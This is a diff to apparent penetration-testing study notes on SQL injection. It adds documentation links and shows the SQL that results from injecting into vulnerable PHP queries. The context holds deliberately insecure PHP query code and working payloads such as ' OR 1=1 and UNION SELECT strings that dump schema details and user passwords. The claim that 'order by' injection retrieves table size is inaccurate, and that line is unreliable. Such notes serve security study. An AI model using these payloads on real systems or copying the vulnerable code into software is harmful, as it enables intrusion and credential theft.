@@ -57,6 +57,8 @@ $ mysql -u root -p'rootpassword' -h $DbServerIp -P $DbServerPort
 
 #### Error-based payloads
 
+Php mysqli queries (stands for MySQL Improved): https://www.php.net/manual/en/mysqli.query.php
+
 Vulnerable Php query:
 ```
 <?php
@@ -80,6 +82,8 @@ someuser ' OR 1=1 -- //
 
 #### Union select
 
+Regular `UNION SELECT`: https://www.mysqltutorial.org/sql-union-mysql.aspx
+
 Vulnerable Php query:
 ```
 $query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
@@ -92,6 +96,12 @@ Injection:
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ' union select null, username, password, description, null from users -- //
 ```
+gives:
+```
+SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
+SELECT * from customers WHERE name LIKE '' union select database(), user(), @@version, null, null -- //'";
+```
+The `order by` injection retrieves the table size.
 
 #### Php injection
 
